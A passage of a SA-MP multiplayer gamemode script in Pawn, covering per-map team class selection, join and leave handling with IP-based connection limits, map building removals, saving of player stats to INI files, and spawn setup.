{
        if(classid == 0)
    {
        SetPlayerSkin(playerid,186);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Human",900,4);
        gteam[playerid] = 1;
    }
    else  if(classid == 1)
    {
        SetPlayerSkin(playerid,185);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Human",900,4);
        gteam[playerid] = 1;
    }
	else if(classid == 2)
    {
        SetPlayerSkin(playerid,200);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~r~Zombie",900,4);
        gteam[playerid] = 2;
    }
   	else if(classid == 3)
    {
        SetPlayerSkin(playerid,230);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~r~Zombie",900,4);
        gteam[playerid] = 2;
    }
}
 else 	if(MapChange == 2)
{
        if(classid == 0 || classid == 1)
    {
        SetPlayerSkin(playerid,33);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Sniper",900,4);
        gteam[playerid] = 1;
    }
    else  if(classid == 2 || classid == 3)
    {
        SetPlayerSkin(playerid,34);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~r~Sniper",900,4);
        gteam[playerid] = 2;
    }
}
 else 	if(MapChange == 3)
{
        if(classid == 0)
    {
        SetPlayerSkin(playerid,249);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Taliban",900,4);
        gteam[playerid] = 1;
    }
    else  if(classid == 1)
    {
        SetPlayerSkin(playerid,248);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Taliban",900,4);
        gteam[playerid] = 1;
    }
     if(classid == 2)
    {
        SetPlayerSkin(playerid,247);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Isis",900,4);
        gteam[playerid] = 2;
    }
    else  if(classid == 3)
    {
        SetPlayerSkin(playerid,124);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Isis",900,4);
        gteam[playerid] = 2;
    }
}
else if(MapChange == 4)
{
        if(classid == 0)
    {
        SetPlayerSkin(playerid,272);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Team-1",900,4);
        gteam[playerid] = 1;
    }
    else  if(classid == 1)
    {
        SetPlayerSkin(playerid,273);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Team-1",900,4);
        gteam[playerid] = 1;
    }
     if(classid == 2)
    {
        SetPlayerSkin(playerid,293);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Team-2",900,4);
        gteam[playerid] = 2;
    }
    else  if(classid == 3)
    {
        SetPlayerSkin(playerid,291);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Team-2",900,4);
        gteam[playerid] = 2;
    }
} else if(MapChange == 5)
{
        if(classid == 0 || classid == 1)
    {
        SetPlayerSkin(playerid,128);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Team-1",900,4);
        gteam[playerid] = 1;
    }
    if(classid == 3 || classid == 2)
    {
        SetPlayerSkin(playerid,122);
        LoopingAnim(playerid, "DANCING", "DNCE_M_B", 4.0, 1, 0, 0, 0, 0);
        GameTextForPlayer(playerid,"~b~Team-2",900,4);
        gteam[playerid] = 1;
    }
    }

	return 1;
}

public OnPlayerConnect(playerid)
{
 TextDrawShowForPlayer(playerid, Don);
    nps[playerid] = 0;
	new msg[128], pname[MAX_PLAYER_NAME];
         GetPlayerName(playerid, pname, MAX_PLAYER_NAME);
         
         format(msg, sizeof(msg), "{b5e0b5}[Join] {9aa59a}%s(%d) Join The Server", pname, playerid);
         SendClientMessageToAll(-1,msg);
         SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________");
         SendClientMessage(playerid, COLOR_RED,   "                   Welcome                     ");
         SendClientMessage(playerid, COLOR_GREEN, "_______________________________________________");
  NewMoney[playerid] = GetPlayerMoney(playerid);
  JetPack[playerid] = 0;
muted[playerid] = false;
AntiCmdSpamTimer[playerid] = SetTimerEx("AntiCommandSpam", 5000, 1, "i", playerid);
TextDrawShowForPlayer(playerid, Textdrawt);
TextDrawShowForPlayer(playerid, Textdrawa);
    TextDrawShowForPlayer(playerid, Textdrawb);
    TextDrawShowForPlayer(playerid, Textdrawc);
    TextDrawShowForPlayer(playerid, Textdrawd);
    TextDrawShowForPlayer(playerid, Textdrawe);
    TextDrawShowForPlayer(playerid, Textdraw5);
    TextDrawShowForPlayer(playerid, Textdraw6);
    TextDrawShowForPlayer(playerid, Textdraw7);
    TextDrawShowForPlayer(playerid, Textdraw8);
    TextDrawShowForPlayer(playerid, Textdraw9);
    TextDrawShowForPlayer(playerid, Textdraw10);
    TextDrawShowForPlayer(playerid, bg);
    TextDrawShowForPlayer(playerid, Textdraw12);
    TextDrawShowForPlayer(playerid, Textdraw13);
    TextDrawShowForPlayer(playerid, Textdraw14);
    TextDrawShowForPlayer(playerid, Textdraw15);
    TextDrawShowForPlayer(playerid, Textdraw16);
    TextDrawShowForPlayer(playerid, Textdraw17);
    TextDrawShowForPlayer(playerid, Textdraw18);
    TextDrawShowForPlayer(playerid, Textdraw19);
    TextDrawShowForPlayer(playerid, Textdraw20);
    TextDrawShowForPlayer(playerid, Textdraw21);
    TextDrawShowForPlayer(playerid, Textdraw22);
    // Guns
    loadtxd(playerid);
    
//--

        new ConnIP[16];
        GetPlayerIp(playerid,ConnIP,16);
        new compare_IP[16];
        new number_IP = 0;
        for(new i=0; i<MAX_PLAYERS; i++) {
                if(IsPlayerConnected(i)) {
                    GetPlayerIp(i,compare_IP,16);
                    if(!strcmp(compare_IP,ConnIP)) number_IP++;
                }
        }
        if((GetTickCount() - Join_Stamp) < Time_Limit)
            exceed=1;
        else
            exceed=0;
        if(strcmp(ban_s, ConnIP, false) == 0 && exceed == 1 )
        {
            Same_IP++;
            if(Same_IP > SAME_IP_CONNECT)
            {
                    SendClientMessage(playerid,-1,":D 2 ta Account?");
                        Kick(playerid);
                        
                        Same_IP=0;
            }
        }
        else
        {
                Same_IP=0;
        }
        if(number_IP > IP_LIMIT)
            Kick(playerid);
        GetStampIP(playerid);
//txd
//RV
RemoveBuildingForPlayer(playerid, 3297, -1568.1016, 2709.6484, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3297, -1493.8359, 2688.9922, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3298, -1568.9609, 2633.5156, 55.3281, 0.25);
RemoveBuildingForPlayer(playerid, 3299, -1518.0313, 2698.5938, 55.2109, 0.25);
RemoveBuildingForPlayer(playerid, 3300, -1534.4453, 2689.2734, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3300, -1464.3438, 2656.5000, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3300, -1574.5469, 2691.6875, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3301, -1566.1719, 2653.8828, 56.7031, 0.25);
RemoveBuildingForPlayer(playerid, 3297, -1584.0547, 2652.4609, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 11599, -1512.1563, 2514.4453, 54.8906, 0.25);
RemoveBuildingForPlayer(playerid, 11600, -1520.9766, 2620.0938, 57.4453, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -1606.2969, 2689.8281, 53.8359, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -1482.3672, 2704.8047, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -1446.4531, 2639.3516, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 3341, -1477.5859, 2549.2344, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 3339, -1589.7188, 2708.6016, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3339, -1510.3516, 2646.6563, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3339, -1448.1328, 2690.7813, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3339, -1476.0391, 2565.3984, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3342, -1548.3359, 2699.6172, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3342, -1463.7656, 2692.8594, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3342, -1447.2344, 2653.3047, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3345, -1448.8594, 2560.5703, 54.8281, 0.25);
RemoveBuildingForPlayer(playerid, 11613, -1320.6875, 2700.9531, 49.2656, 0.25);
RemoveBuildingForPlayer(playerid, 11614, -1328.7188, 2677.5078, 52.2109, 0.25);
RemoveBuildingForPlayer(playerid, 3357, -1523.8047, 2656.6563, 54.8750, 0.25);
RemoveBuildingForPlayer(playerid, 3365, -1425.2344, 2581.2656, 54.8359, 0.25);
RemoveBuildingForPlayer(playerid, 11671, -1459.9375, 2583.1563, 57.9375, 0.25);
RemoveBuildingForPlayer(playerid, 11672, -1520.9609, 2577.1641, 58.3125, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1579.5547, 2640.3750, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 3242, -1584.0547, 2652.4609, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -1606.2969, 2689.8281, 53.8359, 0.25);
RemoveBuildingForPlayer(playerid, 3285, -1574.5469, 2691.6875, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 11480, -1596.2656, 2695.9453, 56.1797, 0.25);
RemoveBuildingForPlayer(playerid, 3169, -1589.7188, 2708.6016, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 11454, -1512.1563, 2514.4453, 54.8906, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1492.7813, 2518.5938, 55.7578, 0.25);
RemoveBuildingForPlayer(playerid, 3241, -1568.9609, 2633.5156, 55.3281, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1534.1406, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1534.1406, 2605.4219, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 11456, -1520.9609, 2577.1641, 58.3125, 0.25);
RemoveBuildingForPlayer(playerid, 11455, -1505.4609, 2539.4922, 56.7891, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1500.1172, 2589.3359, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1515.5547, 2595.2969, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1507.9922, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1520.8906, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1508.0000, 2605.4219, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1520.8906, 2605.4219, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1522, -1509.6563, 2611.1172, 54.8750, 0.25);
RemoveBuildingForPlayer(playerid, 11449, -1520.9766, 2620.0938, 57.4453, 0.25);
RemoveBuildingForPlayer(playerid, 11460, -1523.2891, 2618.5938, 65.4219, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1515.2578, 2635.2188, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 3169, -1510.3516, 2646.6563, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3169, -1476.0391, 2565.3984, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -1477.5859, 2549.2344, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1470.7891, 2553.7109, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1458.9531, 2565.6641, 55.8281, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1459.3203, 2552.8281, 55.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1464.2500, 2556.2344, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1476.7813, 2573.4141, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 11450, -1459.9375, 2583.1563, 57.9375, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1491.7344, 2589.3359, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 956, -1455.1172, 2591.6641, 55.2344, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1467.9531, 2595.4297, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1458.3828, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1483.9531, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1486.0000, 2607.6406, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1479.8359, 2605.4219, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1458.3828, 2605.4219, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1454.2734, 2640.1406, 55.8281, 0.25);
RemoveBuildingForPlayer(playerid, 11461, -1466.0313, 2637.5938, 54.3906, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1457.8672, 2648.9922, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 3172, -1448.8594, 2560.5703, 54.8281, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1437.4141, 2558.0859, 54.9531, 0.25);
RemoveBuildingForPlayer(playerid, 3292, -1425.2344, 2581.2656, 54.8359, 0.25);
RemoveBuildingForPlayer(playerid, 3293, -1420.5469, 2583.9453, 58.0313, 0.25);
RemoveBuildingForPlayer(playerid, 3294, -1420.5469, 2591.1563, 57.7422, 0.25);
RemoveBuildingForPlayer(playerid, 1522, -1450.6406, 2591.4688, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1437.5859, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 1294, -1409.7656, 2597.0391, 59.2734, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -1446.4531, 2639.3516, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1438.6719, 2630.0234, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1375.3594, 2630.2734, 53.1719, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1368.5938, 2635.2422, 51.7344, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1441.7891, 2647.3281, 55.2266, 0.25);
RemoveBuildingForPlayer(playerid, 3284, -1566.1719, 2653.8828, 56.7031, 0.25);
RemoveBuildingForPlayer(playerid, 3242, -1568.1016, 2709.6484, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3173, -1548.3359, 2699.6172, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1538.3906, 2683.9609, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 1506, -1532.1328, 2657.4063, 55.2656, 0.25);
RemoveBuildingForPlayer(playerid, 3355, -1523.8047, 2656.6563, 54.8750, 0.25);
RemoveBuildingForPlayer(playerid, 3283, -1518.0313, 2698.5938, 55.2109, 0.25);
RemoveBuildingForPlayer(playerid, 3285, -1534.4453, 2689.2734, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1504.0859, 2704.5859, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1521.6094, 2707.5781, 55.5781, 0.25);
RemoveBuildingForPlayer(playerid, 3173, -1447.2344, 2653.3047, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 3285, -1464.3438, 2656.5000, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1461.2344, 2678.8359, 55.2500, 0.25);
RemoveBuildingForPlayer(playerid, 1308, -1485.8516, 2680.7422, 55.1563, 0.25);
RemoveBuildingForPlayer(playerid, 3169, -1448.1328, 2690.7813, 54.7266, 0.25);
RemoveBuildingForPlayer(playerid, 3242, -1493.8359, 2688.9922, 56.6484, 0.25);
RemoveBuildingForPlayer(playerid, 3173, -1463.7656, 2692.8594, 54.8203, 0.25);
RemoveBuildingForPlayer(playerid, 700, -1454.8906, 2698.2031, 55.2266, 0.25);
RemoveBuildingForPlayer(playerid, 3170, -1482.3672, 2704.8047, 54.8047, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1449.5234, 2705.4766, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 672, -1466.9922, 2705.9453, 55.8281, 0.25);
RemoveBuildingForPlayer(playerid, 11677, -1303.3672, 2664.0781, 53.5781, 0.25);
RemoveBuildingForPlayer(playerid, 1686, -1329.2031, 2669.2813, 49.4531, 0.25);
RemoveBuildingForPlayer(playerid, 1686, -1328.5859, 2674.7109, 49.4531, 0.25);
RemoveBuildingForPlayer(playerid, 11547, -1328.7188, 2677.5078, 52.2109, 0.25);
RemoveBuildingForPlayer(playerid, 1686, -1327.7969, 2680.1250, 49.4531, 0.25);
RemoveBuildingForPlayer(playerid, 1686, -1327.0313, 2685.5938, 49.4531, 0.25);
RemoveBuildingForPlayer(playerid, 669, -1437.5234, 2691.8984, 55.2422, 0.25);
RemoveBuildingForPlayer(playerid, 3410, -1217.6875, 2692.7813, 45.9531, 0.25);
RemoveBuildingForPlayer(playerid, 11546, -1320.6875, 2700.9531, 49.2656, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 149.9141, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 161.7891, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 123.0469, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 311.1328, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 176.7891, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 338.0078, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3368, 323.0078, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 203.6563, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 230.5234, 2641.4844, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 349.8750, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 269.2656, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 242.3984, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 188.6563, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3369, 108.0469, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 176.7891, 2641.4844, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 230.5234, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 257.3984, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 284.2656, 2641.4844, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 284.2656, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 296.1406, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 215.5313, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3367, 134.9141, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 16772, 404.7969, 2454.7188, 22.0547, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 108.0469, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 161.7891, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 188.6563, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 134.9141, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 215.5313, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 242.3984, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 269.2656, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 296.1406, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 123.0469, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 176.7891, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 230.5234, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 284.2656, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 149.9141, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 176.7891, 2641.4844, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 230.5234, 2641.4844, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 203.6563, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 257.3984, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3271, 284.2656, 2641.4844, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 323.0078, 2411.3828, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3269, 349.8750, 2438.2500, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 338.0078, 2587.7422, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3270, 311.1328, 2614.6172, 15.4766, 0.25);
RemoveBuildingForPlayer(playerid, 16771, 404.7969, 2454.7188, 22.0547, 0.25);
RemoveBuildingForPlayer(playerid, 16773, 397.4766, 2476.6328, 19.5156, 0.25);
RemoveBuildingForPlayer(playerid, 16775, 412.1172, 2476.6328, 19.5156, 0.25);
	new cname[MAX_PLAYER_NAME], path[200];
GetPlayerName(playerid, cname, sizeof(cname));
format(path, sizeof(path), "/spieler/%s.ini", cname);

if(!dini_Exists(path))
{
   ShowPlayerDialog(playerid, DIALOG_REGISTER1, DIALOG_STYLE_INPUT, "Register", "Password Ra Vared Konid (6 Character)", "OK", "Cancel");
}
else
{
   reg[playerid] = 1;
   ShowPlayerDialog(playerid, DIALOG_LOGIN1, DIALOG_STYLE_INPUT, "Login", "Password Ra Vared Konid (6 Character)", "OK", "Cancel");
}
  return 1;
}

public OnPlayerDisconnect(playerid, reason)
{
SpectateOff(playerid);
if(cp[playerid] == 1 && prt[playerid] == 1)
{
cp[playerid] = 0;
prt[playerid] = 0;
DisablePlayerCheckpoint(playerid);
new vehid; vehid = GetPlayerVehicleID(playerid);
SetVehicleToRespawn(vehid);
}
if(isRelogging[playerid])
    {
        new string[30];
        isRelogging[playerid] = false;
        format(string, sizeof(string), "unbanip %s", relogPlayerIP[playerid]);
        SendRconCommand(string);
    }

hideshoptxd(playerid);
new MessageStr[128];
switch(reason) 
	{
        	case 0: format(MessageStr,sizeof MessageStr,"Timeout/Crash");
        	case 1: format(MessageStr,sizeof MessageStr,"/q");
        	case 2: format(MessageStr,sizeof MessageStr,"kicked/banned");
	}
new msg[128], pname[MAX_PLAYER_NAME];
         GetPlayerName(playerid, pname, MAX_PLAYER_NAME);
         format(msg, sizeof(msg), "{b5e0b5}[Leave] {9aa59a}%s(%d) Left the server {8c6741}(%s)", pname, playerid,MessageStr);
         SendClientMessageToAll(-1,msg);
         printf(msg);
 KillTimer(AntiCmdSpamTimer[playerid]);
        CommandCount[playerid] = 0;
    if(playerid == ponykey) ponykey=300;
	new cname[MAX_PLAYER_NAME], path[200];
GetPlayerName(playerid, cname, sizeof(cname));
format(path, sizeof(path), "/spieler/%s.ini", cname);

dini_IntSet(path, "Cash",GetPlayerMoney(playerid));
dini_IntSet(path, "Admin",PlayerInfo[playerid][pAdmin]);
dini_IntSet(path, "Kills",PlayerInfo[playerid][pKills]);
dini_IntSet(path, "Deaths",PlayerInfo[playerid][pDeaths]);
dini_IntSet(path, "Vip",PlayerInfo[playerid][pVip]);
dini_IntSet(path, "Score",PlayerInfo[playerid][pScore]);
dini_IntSet(path, "Tala",PlayerInfo[playerid][pTala]);
dini_IntSet(path, "Clan",PlayerInfo[playerid][pClan]);
dini_IntSet(path, "Rank",PlayerInfo[playerid][pRank]);
dini_IntSet(path, "Drugs",PlayerInfo[playerid][pDrugs]);
dini_IntSet(path, "Ak",PlayerInfo[playerid][pAk]);
dini_IntSet(path, "M4",PlayerInfo[playerid][pM4]);
dini_IntSet(path, "Mp5",PlayerInfo[playerid][pMp5]);
dini_IntSet(path, "Snipe",PlayerInfo[playerid][pSnipe]);
dini_IntSet(path, "Sawn",PlayerInfo[playerid][pSawn]);
dini_IntSet(path, "Shotgun",PlayerInfo[playerid][pShotgun]);

PlayerInfo[playerid][pLog] = 0;
    gteam[playerid] = 0;
    pbomb[playerid] = 0;
    Jailed[playerid] = 0;
    muted[playerid] = false;
    return 1;
}
public okload(playerid)
{
TogglePlayerControllable(playerid,true);
GameTextForPlayer(playerid,"(All Object Loaded)",3500,1);
if(MapChange == 5)
 SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
return 1;
}

public loadtimer(playerid)
{

GameTextForPlayer(playerid,"(Loading Object)",3500,1);
TogglePlayerControllable(playerid,false);
TogglePlayerControllable(playerid,false);
SetTimerEx("okload", 2000, 0, "i", playerid);
}
public OnPlayerSpawn(playerid)
{
if(PlayerInfo[playerid][pLog] == 0) { ShowPlayerDialog(playerid, DIALOG_LOGIN1, DIALOG_STYLE_INPUT, "Login", "Your Password", "OK", "Cancel"); return 0;}
TogglePlayerSpectating(playerid, false);
StopAudioStreamForPlayer(playerid);
if(reg[playerid] == 0) return 1;
TextDrawShowForPlayer(playerid, tdg);
shoptxd(playerid);
realcash[playerid] = false;
SetPlayerVirtualWorld(playerid,0);
isplayerspawn[playerid] = true;
SetTimerEx("okload", 2000, 0, "i", playerid);
loadtimer(playerid);
SetTimerEx("okload", 2000, 0, "i", playerid);
//actors
ApplyActorAnimation(g_Actor[0], "BEACH", "PARKSIT_M_LOOP", 4.0999, 1, 0, 0, 0, 0);
ApplyActorAnimation(g_Actor[1], "BEACH", "PARKSIT_M_LOOP", 4.0999, 1, 0, 0, 0, 0);
ApplyActorAnimation(g_Actor[0], "BEACH", "PARKSIT_M_LOOP", 4.0999, 1, 0, 0, 0, 0);
ApplyActorAnimation(g_Actor[1], "BEACH", "PARKSIT_M_LOOP", 4.0999, 1, 0, 0, 0, 0);
//hideTextdrawt
TextDrawShowForPlayer(playerid, Textdrawt);
TextDrawShowForPlayer(playerid, Amar1);
    TextDrawShowForPlayer(playerid, Amar2);
    TextDrawShowForPlayer(playerid, Amar3);//tdrw1
    TextDrawHideForPlayer(playerid, Don);
    TextDrawHideForPlayer(playerid, tdrw0);
    TextDrawHideForPlayer(playerid, tdrw1);
    TextDrawHideForPlayer(playerid, tdrw2);
TextDrawHideForPlayer(playerid, Textdrawa);
    TextDrawHideForPlayer(playerid, Textdrawb);
    TextDrawHideForPlayer(playerid, Textdrawc);
    TextDrawHideForPlayer(playerid, Textdrawd);
    TextDrawHideForPlayer(playerid, Textdrawe);
    TextDrawHideForPlayer(playerid, Textdraw5);
    TextDrawHideForPlayer(playerid, Textdraw6);
    TextDrawHideForPlayer(playerid, Textdraw7);
    TextDrawHideForPlayer(playerid, Textdraw8);
    TextDrawHideForPlayer(playerid, Textdraw9);
    TextDrawHideForPlayer(playerid, Textdraw10);
    TextDrawHideForPlayer(playerid, bg);
    TextDrawHideForPlayer(playerid, Textdraw12);
    TextDrawHideForPlayer(playerid, Textdraw13);
    TextDrawHideForPlayer(playerid, Textdraw14);
    TextDrawHideForPlayer(playerid, Textdraw15);
    TextDrawHideForPlayer(playerid, Textdraw16);
    TextDrawHideForPlayer(playerid, Textdraw17);
    TextDrawHideForPlayer(playerid, Textdraw18);
    TextDrawHideForPlayer(playerid, Textdraw19);
    TextDrawHideForPlayer(playerid, Textdraw20);
    TextDrawHideForPlayer(playerid, Textdraw21);
    TextDrawHideForPlayer(playerid, Textdraw22);
    //end
 if (gteam[playerid] == 2) SetPlayerColor(playerid,COLOR_RED); else if (gteam[playerid] == 1) SetPlayerColor(playerid,COLOR_BLUE); else SetPlayerColor(playerid,COLOR_GREY);
 if(MapChange == 0){
 SetPlayerHealth(playerid,100);
 if(gteam[playerid] == 2)
 {
  new rand = random(sizeof(Rsdt));
SetPlayerPos(playerid,Rsdt[rand][0], Rsdt[rand][1],Rsdt[rand][2]);
 SetPlayerFacingAngle(playerid,Rsdt[rand][3]);
GivePlayerWeaponEx(playerid, 32, 64);isplayerspawn[playerid] = true;
 }else if(gteam[playerid] == 1)
 {
 new rand = random(sizeof(Rsdct));
SetPlayerPos(playerid,Rsdct[rand][0], Rsdct[rand][1],Rsdct[rand][2]);
 SetPlayerFacingAngle(playerid,Rsdct[rand][3]);
 GivePlayerWeaponEx(playerid,4,1);
 GivePlayerWeaponEx(playerid,4,1);
 GivePlayerWeaponEx(playerid, 32, 64);isplayerspawn[playerid] = true;

 }
 }
